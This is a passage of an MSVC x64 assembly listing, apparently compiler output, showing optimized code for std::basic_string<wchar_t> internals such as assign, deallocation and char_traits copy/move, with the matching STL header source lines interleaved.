this$ = 8
?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAPEA_WXZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr, COMDAT

; 2244 :         return _Myres > _Small_string_capacity;

  00000	48 83 79 18 07	 cmp	 QWORD PTR [rcx+24], 7

; 2226 :         value_type* _Result = _Bx._Buf;
; 2227 :         if (_Large_mode_engaged()) {

  00005	76 04		 jbe	 SHORT $LN6@Myptr

; 2228 :             _Result = _Unfancy(_Bx._Ptr);
; 2229 :         }
; 2230 : 
; 2231 :         return _Result;

  00007	48 8b 01	 mov	 rax, QWORD PTR [rcx]

; 2232 :     }

  0000a	c3		 ret	 0
$LN6@Myptr:

; 2228 :             _Result = _Unfancy(_Bx._Ptr);
; 2229 :         }
; 2230 : 
; 2231 :         return _Result;

  0000b	48 8b c1	 mov	 rax, rcx

; 2232 :     }

  0000e	c3		 ret	 0
?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAPEA_WXZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ
_TEXT	SEGMENT
this$ = 8
?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ PROC ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first, COMDAT

; 1531 :         return *this;

  00000	48 8b c1	 mov	 rax, rcx

; 1532 :     }

  00003	c3		 ret	 0
?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ ENDP ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z
_TEXT	SEGMENT
this$ = 48
_Ptr$ = 56
_Count$ = 64
?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign, COMDAT

; 3410 :         _In_reads_(_Count) const _Elem* const _Ptr, _CRT_GUARDOVERFLOW const size_type _Count) {

$LN14:
  00000	40 57		 push	 rdi
  00002	48 83 ec 20	 sub	 rsp, 32			; 00000020H

; 3411 :         // assign [_Ptr, _Ptr + _Count)
; 3412 :         if (_Count <= _Mypair._Myval2._Myres) {

  00006	48 8b 41 18	 mov	 rax, QWORD PTR [rcx+24]
  0000a	48 8b f9	 mov	 rdi, rcx
  0000d	4c 3b c0	 cmp	 r8, rax
  00010	77 42		 ja	 SHORT $LN2@assign
  00012	48 89 5c 24 30	 mov	 QWORD PTR [rsp+48], rbx
  00017	48 89 74 24 38	 mov	 QWORD PTR [rsp+56], rsi

; 2226 :         value_type* _Result = _Bx._Buf;

  0001c	48 8b f1	 mov	 rsi, rcx

; 2244 :         return _Myres > _Small_string_capacity;

  0001f	48 83 f8 07	 cmp	 rax, 7

; 2227 :         if (_Large_mode_engaged()) {

  00023	76 03		 jbe	 SHORT $LN5@assign

; 2228 :             _Result = _Unfancy(_Bx._Ptr);

  00025	48 8b 31	 mov	 rsi, QWORD PTR [rcx]
$LN5@assign:

; 3413 :             _ASAN_STRING_REMOVE(*this);
; 3414 :             _Elem* const _Old_ptr   = _Mypair._Myval2._Myptr();
; 3415 :             _Mypair._Myval2._Mysize = _Count;

  00028	4c 89 41 10	 mov	 QWORD PTR [rcx+16], r8

; 117  :         _CSTD memmove(_First1, _First2, _Count * sizeof(_Elem));

  0002c	4b 8d 1c 00	 lea	 rbx, QWORD PTR [r8+r8]
  00030	4c 8b c3	 mov	 r8, rbx
  00033	48 8b ce	 mov	 rcx, rsi
  00036	e8 00 00 00 00	 call	 memmove

; 3416 :             _Traits::move(_Old_ptr, _Ptr, _Count);
; 3417 :             _Traits::assign(_Old_ptr[_Count], _Elem());

  0003b	33 c0		 xor	 eax, eax
  0003d	66 89 04 33	 mov	 WORD PTR [rbx+rsi], ax

; 3418 :             _ASAN_STRING_CREATE(*this);
; 3419 :             return *this;

  00041	48 8b c7	 mov	 rax, rdi
  00044	48 8b 74 24 38	 mov	 rsi, QWORD PTR [rsp+56]
  00049	48 8b 5c 24 30	 mov	 rbx, QWORD PTR [rsp+48]

; 3423 :             _Count,
; 3424 :             [](_Elem* const _New_ptr, const size_type _Count, const _Elem* const _Ptr) {
; 3425 :                 _Traits::copy(_New_ptr, _Ptr, _Count);
; 3426 :                 _Traits::assign(_New_ptr[_Count], _Elem());
; 3427 :             },
; 3428 :             _Ptr);
; 3429 :     }

  0004e	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00052	5f		 pop	 rdi
  00053	c3		 ret	 0
$LN2@assign:

; 3420 :         }
; 3421 : 
; 3422 :         return _Reallocate_for(

  00054	4c 8b ca	 mov	 r9, rdx
  00057	49 8b d0	 mov	 rdx, r8

; 3423 :             _Count,
; 3424 :             [](_Elem* const _New_ptr, const size_type _Count, const _Elem* const _Ptr) {
; 3425 :                 _Traits::copy(_New_ptr, _Ptr, _Count);
; 3426 :                 _Traits::assign(_New_ptr[_Count], _Elem());
; 3427 :             },
; 3428 :             _Ptr);
; 3429 :     }

  0005a	48 83 c4 20	 add	 rsp, 32			; 00000020H
  0005e	5f		 pop	 rdi

; 3420 :         }
; 3421 : 
; 3422 :         return _Reallocate_for(

  0005f	e9 00 00 00 00	 jmp	 ??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_for<`std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>,wchar_t const *>
?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??R<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV23@QEB_W_K@Z@QEBA@QEA_W10@Z
_TEXT	SEGMENT
this$dead$ = 48
_New_ptr$ = 56
_Count$ = 64
_Ptr$ = 72
??R<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV23@QEB_W_K@Z@QEBA@QEA_W10@Z PROC ; `std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>::operator(), COMDAT

; 3424 :             [](_Elem* const _New_ptr, const size_type _Count, const _Elem* const _Ptr) {

$LN6:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	57		 push	 rdi
  00006	48 83 ec 20	 sub	 rsp, 32			; 00000020H
  0000a	48 8b fa	 mov	 rdi, rdx

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  0000d	4b 8d 1c 00	 lea	 rbx, QWORD PTR [r8+r8]
  00011	4c 8b c3	 mov	 r8, rbx
  00014	48 8b cf	 mov	 rcx, rdi
  00017	49 8b d1	 mov	 rdx, r9
  0001a	e8 00 00 00 00	 call	 memcpy

; 3425 :                 _Traits::copy(_New_ptr, _Ptr, _Count);
; 3426 :                 _Traits::assign(_New_ptr[_Count], _Elem());

  0001f	33 c0		 xor	 eax, eax
  00021	66 89 04 3b	 mov	 WORD PTR [rbx+rdi], ax

; 3427 :             },

  00025	48 8b 5c 24 30	 mov	 rbx, QWORD PTR [rsp+48]
  0002a	48 83 c4 20	 add	 rsp, 32			; 00000020H
  0002e	5f		 pop	 rdi
  0002f	c3		 ret	 0
??R<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV23@QEB_W_K@Z@QEBA@QEA_W10@Z ENDP ; `std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>::operator()
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Deallocate_for_capacity@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAXAEAV?$allocator@_W@2@QEA_W_K@Z
_TEXT	SEGMENT
_Al$dead$ = 48
_Old_ptr$ = 56
_Capacity$ = 64
?_Deallocate_for_capacity@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAXAEAV?$allocator@_W@2@QEA_W_K@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Deallocate_for_capacity, COMDAT

; 2638 :         _Alty& _Al, const pointer _Old_ptr, const size_type _Capacity) noexcept {

$LN23:
  00000	48 83 ec 28	 sub	 rsp, 40			; 00000028H
  00004	48 8b c2	 mov	 rax, rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 977  :         _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

  00007	4a 8d 14 45 02
	00 00 00	 lea	 rdx, QWORD PTR [r8*2+2]

; 264  :         if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  0000f	48 81 fa 00 10
	00 00		 cmp	 rdx, 4096		; 00001000H
  00016	72 18		 jb	 SHORT $LN17@Deallocate

; 163  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

  00018	48 8b 48 f8	 mov	 rcx, QWORD PTR [rax-8]
  0001c	48 83 c2 27	 add	 rdx, 39			; 00000027H

; 164  : 
; 165  :     // If the following asserts, it likely means that we are performing
; 166  :     // an aligned delete on memory coming from an unaligned allocation.
; 167  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 168  : 
; 169  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 170  :     // in range [_Min_back_shift, _Non_user_size]
; 171  : #ifdef _DEBUG
; 172  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 173  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 174  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 175  : #endif // ^^^ !defined(_DEBUG) ^^^
; 176  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

  00020	48 2b c1	 sub	 rax, rcx

; 177  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  00023	48 83 c0 f8	 add	 rax, -8
  00027	48 83 f8 1f	 cmp	 rax, 31
  0002b	77 0f		 ja	 SHORT $LN14@Deallocate

; 178  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

  0002d	48 8b c1	 mov	 rax, rcx
$LN17@Deallocate:

; 268  :         ::operator delete(_Ptr, _Bytes);

  00030	48 8b c8	 mov	 rcx, rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2641 :     }

  00033	48 83 c4 28	 add	 rsp, 40			; 00000028H
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 268  :         ::operator delete(_Ptr, _Bytes);

  00037	e9 00 00 00 00	 jmp	 ??3@YAXPEAX_K@Z		; operator delete
$LN14@Deallocate:

; 177  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  0003c	e8 00 00 00 00	 call	 _invalid_parameter_noinfo_noreturn
  00041	cc		 int	 3
$LN21@Deallocate:
?_Deallocate_for_capacity@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAXAEAV?$allocator@_W@2@QEA_W_K@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Deallocate_for_capacity
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Switch_to_buf@_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ
_TEXT	SEGMENT
this$dead$ = 8
?_Switch_to_buf@_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::_Switch_to_buf, COMDAT

; 2292 :             _STD _Destroy_in_place(_Ptr);
; 2293 : 
; 2294 : #if _HAS_CXX20
; 2295 :             // start the lifetime of the array elements
; 2296 :             if (_STD is_constant_evaluated()) {
; 2297 :                 for (size_type _Idx = 0; _Idx < _BUF_SIZE; ++_Idx) {
; 2298 :                     _Buf[_Idx] = value_type();
; 2299 :                 }
; 2300 :             }
; 2301 : #endif // _HAS_CXX20
; 2302 :         }

  00000	c2 00 00	 ret	 0
?_Switch_to_buf@_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::_Switch_to_buf
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Activate_SSO_buffer@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ
_TEXT	SEGMENT
this$dead$ = 8
?_Activate_SSO_buffer@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_Activate_SSO_buffer, COMDAT

; 2248 :         // start the lifetime of the array elements
; 2249 : #if _HAS_CXX20
; 2250 :         if (_STD is_constant_evaluated()) {
; 2251 :             for (size_type _Idx = 0; _Idx < _BUF_SIZE; ++_Idx) {
; 2252 :                 _Bx._Buf[_Idx] = value_type();
; 2253 :             }
; 2254 :         }
; 2255 : #endif // _HAS_CXX20
; 2256 :     }

  00000	c2 00 00	 ret	 0
?_Activate_SSO_buffer@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_Activate_SSO_buffer
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Large_mode_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?_Large_mode_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBA_NXZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_Large_mode_engaged, COMDAT

; 2244 :         return _Myres > _Small_string_capacity;

  00000	48 83 79 18 07	 cmp	 QWORD PTR [rcx+24], 7
  00005	0f 97 c0	 seta	 al

; 2245 :     }

  00008	c3		 ret	 0
?_Large_mode_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBA_NXZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_Large_mode_engaged
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z
_TEXT	SEGMENT
_Left$ = 8
_Right$ = 16
?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z PROC	; std::_WChar_traits<wchar_t>::assign, COMDAT

; 295  : #if _HAS_CXX20
; 296  :         if (_STD is_constant_evaluated()) {
; 297  :             return _Primary_char_traits::assign(_Left, _Right);
; 298  :         }
; 299  : #endif // _HAS_CXX20
; 300  :         _Left = _Right;

  00000	0f b7 02	 movzx	 eax, WORD PTR [rdx]
  00003	66 89 01	 mov	 WORD PTR [rcx], ax

; 301  :     }

  00006	c3		 ret	 0
?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z ENDP	; std::_WChar_traits<wchar_t>::assign
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?length@?$_WChar_traits@_W@std@@SA_KPEB_W@Z
_TEXT	SEGMENT
_First$ = 8
?length@?$_WChar_traits@_W@std@@SA_KPEB_W@Z PROC	; std::_WChar_traits<wchar_t>::length, COMDAT

; 256  :         // find length of null-terminated sequence
; 257  : #if _HAS_CXX17
; 258  :         if constexpr (is_same_v<_Elem, wchar_t>) {
; 259  :             return __builtin_wcslen(_First);
; 260  :         } else {
; 261  :             return _Primary_char_traits::length(_First);
; 262  :         }
; 263  : #else // ^^^ _HAS_CXX17 / !_HAS_CXX17 vvv
; 264  :         return _CSTD wcslen(reinterpret_cast<const wchar_t*>(_First));

  00000	48 c7 c0 ff ff
	ff ff		 mov	 rax, -1
  00007	66 0f 1f 84 00
	00 00 00 00	 npad	 9
$LL3@length:
  00010	48 ff c0	 inc	 rax
  00013	66 83 3c 41 00	 cmp	 WORD PTR [rcx+rax*2], 0
  00018	75 f6		 jne	 SHORT $LL3@length

; 265  : #endif // ^^^ !_HAS_CXX17 ^^^
; 266  :     }

  0001a	c3		 ret	 0
?length@?$_WChar_traits@_W@std@@SA_KPEB_W@Z ENDP	; std::_WChar_traits<wchar_t>::length
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z
_TEXT	SEGMENT
_First1$ = 48
_First2$ = 56
_Count$ = 64
?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z PROC ; std::_Char_traits<wchar_t,unsigned short>::copy, COMDAT

; 48   :         _In_reads_(_Count) const _Elem* const _First2, const size_t _Count) noexcept /* strengthened */ {

$LN4:
  00000	40 53		 push	 rbx
  00002	48 83 ec 20	 sub	 rsp, 32			; 00000020H

; 49   :         // copy [_First2, _First2 + _Count) to [_First1, ...)
; 50   : #if _HAS_MEMCPY_MEMMOVE_INTRINSICS
; 51   :         __builtin_memcpy(_First1, _First2, _Count * sizeof(_Elem));
; 52   : #else // ^^^ _HAS_MEMCPY_MEMMOVE_INTRINSICS / !_HAS_MEMCPY_MEMMOVE_INTRINSICS vvv
; 53   : #if _HAS_CXX20
; 54   :         if (_STD is_constant_evaluated()) {
; 55   :             // pre: [_First1, _First1 + _Count) and [_First2, _First2 + _Count) do not overlap
; 56   :             for (size_t _Idx = 0; _Idx != _Count; ++_Idx) {
; 57   :                 _First1[_Idx] = _First2[_Idx];
; 58   :             }
; 59   : 
; 60   :             return _First1;
; 61   :         }
; 62   : #endif // _HAS_CXX20
; 63   : 
; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  00006	4d 03 c0	 add	 r8, r8
  00009	48 8b d9	 mov	 rbx, rcx
  0000c	e8 00 00 00 00	 call	 memcpy

; 65   : #endif // ^^^ !_HAS_MEMCPY_MEMMOVE_INTRINSICS ^^^
; 66   : 
; 67   :         return _First1;

  00011	48 8b c3	 mov	 rax, rbx

; 68   :     }

  00014	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00018	5b		 pop	 rbx
  00019	c3		 ret	 0
?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z ENDP ; std::_Char_traits<wchar_t,unsigned short>::copy
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\utility
;	COMDAT ??$max@_K@std@@YAAEB_KAEB_K0@Z
_TEXT	SEGMENT
_Left$ = 8
_Right$ = 16
??$max@_K@std@@YAAEB_KAEB_K0@Z PROC			; std::max<unsigned __int64>, COMDAT

; 76   :     // return larger of _Left and _Right
; 77   :     return _Left < _Right ? _Right : _Left;

  00000	48 8b 02	 mov	 rax, QWORD PTR [rdx]
  00003	48 39 01	 cmp	 QWORD PTR [rcx], rax
  00006	48 0f 42 ca	 cmovb	 rcx, rdx
  0000a	48 8b c1	 mov	 rax, rcx

; 78   : }

  0000d	c3		 ret	 0
??$max@_K@std@@YAAEB_KAEB_K0@Z ENDP			; std::max<unsigned __int64>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?deallocate@?$allocator@_W@std@@QEAAXQEA_W_K@Z
_TEXT	SEGMENT
this$dead$ = 48
_Ptr$ = 56
_Count$ = 64
?deallocate@?$allocator@_W@std@@QEAAXQEA_W_K@Z PROC	; std::allocator<wchar_t>::deallocate, COMDAT

; 974  :     _CONSTEXPR20 void deallocate(_Ty* const _Ptr, const size_t _Count) {

$LN20:
  00000	48 83 ec 28	 sub	 rsp, 40			; 00000028H
  00004	48 8b c2	 mov	 rax, rdx

; 975  :         _STL_ASSERT(_Ptr != nullptr || _Count == 0, "null pointer cannot point to a block of non-zero size");
; 976  :         // no overflow check on the following multiply; we assume _Allocate did that check
; 977  :         _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

  00007	4b 8d 14 00	 lea	 rdx, QWORD PTR [r8+r8]

; 264  :         if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  0000b	48 81 fa 00 10
	00 00		 cmp	 rdx, 4096		; 00001000H
  00012	72 18		 jb	 SHORT $LN15@deallocate

; 163  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

  00014	48 8b 48 f8	 mov	 rcx, QWORD PTR [rax-8]
  00018	48 83 c2 27	 add	 rdx, 39			; 00000027H

; 164  : 
; 165  :     // If the following asserts, it likely means that we are performing
; 166  :     // an aligned delete on memory coming from an unaligned allocation.
; 167  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 168  : 
; 169  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 170  :     // in range [_Min_back_shift, _Non_user_size]
; 171  : #ifdef _DEBUG
; 172  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 173  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 174  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 175  : #endif // ^^^ !defined(_DEBUG) ^^^
; 176  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

  0001c	48 2b c1	 sub	 rax, rcx

; 177  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  0001f	48 83 c0 f8	 add	 rax, -8
  00023	48 83 f8 1f	 cmp	 rax, 31
  00027	77 0f		 ja	 SHORT $LN12@deallocate

; 178  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

  00029	48 8b c1	 mov	 rax, rcx
$LN15@deallocate:

; 268  :         ::operator delete(_Ptr, _Bytes);

  0002c	48 8b c8	 mov	 rcx, rax

; 978  :     }

  0002f	48 83 c4 28	 add	 rsp, 40			; 00000028H

; 268  :         ::operator delete(_Ptr, _Bytes);

  00033	e9 00 00 00 00	 jmp	 ??3@YAXPEAX_K@Z		; operator delete
$LN12@deallocate:

; 177  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  00038	e8 00 00 00 00	 call	 _invalid_parameter_noinfo_noreturn
  0003d	cc		 int	 3
$LN18@deallocate:
?deallocate@?$allocator@_W@std@@QEAAXQEA_W_K@Z ENDP	; std::allocator<wchar_t>::deallocate
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?move@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z
_TEXT	SEGMENT
_First1$ = 48
_First2$ = 56
_Count$ = 64
?move@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z PROC ; std::_Char_traits<wchar_t,unsigned short>::move, COMDAT

; 79   :         _In_reads_(_Count) const _Elem* const _First2, const size_t _Count) noexcept /* strengthened */ {

$LN4:
  00000	40 53		 push	 rbx
  00002	48 83 ec 20	 sub	 rsp, 32			; 00000020H

; 80   :         // copy [_First2, _First2 + _Count) to [_First1, ...), allowing overlap
; 81   : #if _HAS_MEMCPY_MEMMOVE_INTRINSICS
; 82   :         __builtin_memmove(_First1, _First2, _Count * sizeof(_Elem));
; 83   : #else // ^^^ _HAS_MEMCPY_MEMMOVE_INTRINSICS / !_HAS_MEMCPY_MEMMOVE_INTRINSICS vvv
; 84   : #if _HAS_CXX20
; 85   :         if (_STD is_constant_evaluated()) {
; 86   :             // dest: [_First1, _First1 + _Count)
; 87   :             // src: [_First2, _First2 + _Count)
; 88   :             // We need to handle overlapping ranges.
; 89   :             // If _First1 is in the src range, we need a backward loop.
; 90   :             // Otherwise, the forward loop works (even if the back of dest overlaps the front of src).
; 91   : 
; 92   :             // Usually, we would compare pointers with less-than, even though they could belong to different arrays.
; 93   :             // However, we're not allowed to do that during constant evaluation, so we need a linear scan for equality.
; 94   :             bool _Loop_forward = true;
; 95   : 
; 96   :             for (const _Elem* _Src = _First2; _Src != _First2 + _Count; ++_Src) {
; 97   :                 if (_First1 == _Src) {
; 98   :                     _Loop_forward = false;
; 99   :                     break;
; 100  :                 }
; 101  :             }
; 102  : 
; 103  :             if (_Loop_forward) {
; 104  :                 for (size_t _Idx = 0; _Idx != _Count; ++_Idx) {
; 105  :                     _First1[_Idx] = _First2[_Idx];
; 106  :                 }
; 107  :             } else {
; 108  :                 for (size_t _Idx = _Count; _Idx != 0; --_Idx) {
; 109  :                     _First1[_Idx - 1] = _First2[_Idx - 1];
; 110  :                 }
; 111  :             }
; 112  : 
; 113  :             return _First1;
; 114  :         }
; 115  : #endif // _HAS_CXX20
; 116  : 
; 117  :         _CSTD memmove(_First1, _First2, _Count * sizeof(_Elem));

  00006	4d 03 c0	 add	 r8, r8
  00009	48 8b d9	 mov	 rbx, rcx
  0000c	e8 00 00 00 00	 call	 memmove

; 118  : #endif // ^^^ !_HAS_MEMCPY_MEMMOVE_INTRINSICS ^^^
; 119  : 
; 120  :         return _First1;

  00011	48 8b c3	 mov	 rax, rbx

; 121  :     }

  00014	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00018	5b		 pop	 rbx
  00019	c3		 ret	 0
?move@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z ENDP ; std::_Char_traits<wchar_t,unsigned short>::move
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z
_TEXT	SEGMENT
this$ = 8
__formal$dead$ = 16
??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z PROC ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><>, COMDAT
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2308 :     size_type _Mysize = 0; // current length of string (size)

  00000	33 c0		 xor	 eax, eax
  00002	0f 57 c0	 xorps	 xmm0, xmm0

